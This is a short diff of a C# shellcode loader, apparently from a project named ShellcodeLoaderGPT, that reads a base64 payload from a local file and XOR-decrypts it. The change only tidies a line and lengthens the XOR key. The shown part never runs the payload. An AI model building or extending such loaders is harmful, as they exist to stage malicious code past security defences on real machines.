@@ -30,13 +30,13 @@ namespace ShellcodeLoader
         static void Main(string[] args)
         {
             // Base64 raw payload
-            string base64String = File.ReadAllText("C:\\Users\\kyria\\Desktop\\github\\ShellcodeLoaderGPT\\ShellcodeLoaderGPT\\encrypted.txt"); ;
+            string base64String = File.ReadAllText("C:\\Users\\kyria\\Desktop\\github\\ShellcodeLoaderGPT\\ShellcodeLoaderGPT\\encrypted.txt");
 
             // Base64 decode
             byte[] shellcode = Convert.FromBase64String(base64String);
 
             // Xor Decrypt
-            byte[] keyBytes = new byte[] { 0xAB, 0xCD, 0xEF };
+            byte[] keyBytes = new byte[] { 0xAB, 0xCD, 0xEF, 0x54, 0xde, 0xad, 0xbe, 0xef };
             
             byte[] decryptedBytes = XOR(shellcode, keyBytes);
 
